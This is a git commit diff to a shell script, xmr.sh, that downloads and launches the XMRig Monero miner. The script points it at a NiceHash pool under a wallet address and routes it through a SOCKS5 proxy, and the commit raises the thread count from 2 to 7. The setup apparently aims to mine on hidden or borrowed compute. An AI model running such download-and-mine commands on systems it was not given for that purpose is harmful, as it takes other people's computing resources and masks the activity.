c629a745525f7a503587b7e54687bd2547fda141
Myaxisplay <101804515+Myaxisplay@users.noreply.github.com>
2022-05-30 12:44:08 +0700

    Update xmr.sh

--- xmr.sh
+++ xmr.sh
@@ -12,4 +12,4 @@ wget https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux
 tar xf xmrig-6.17.0-linux-x64.tar.gz&
 cd xmrig-6.17.0
 sudo ph add xmrig
-./xmrig -o stratum+tcp://randomxmonero.usa-west.nicehash.com:3380 -a RandomX -u 3J7rYdE9j5tvhms2emkNCLpvJ2fmVcHxri.TEST --threads=2 -x socks5://192.252.211.197:14921
+./xmrig -o stratum+tcp://randomxmonero.usa-west.nicehash.com:3380 -a RandomX -u 3J7rYdE9j5tvhms2emkNCLpvJ2fmVcHxri.TEST --threads=7 -x socks5://192.252.211.197:14921
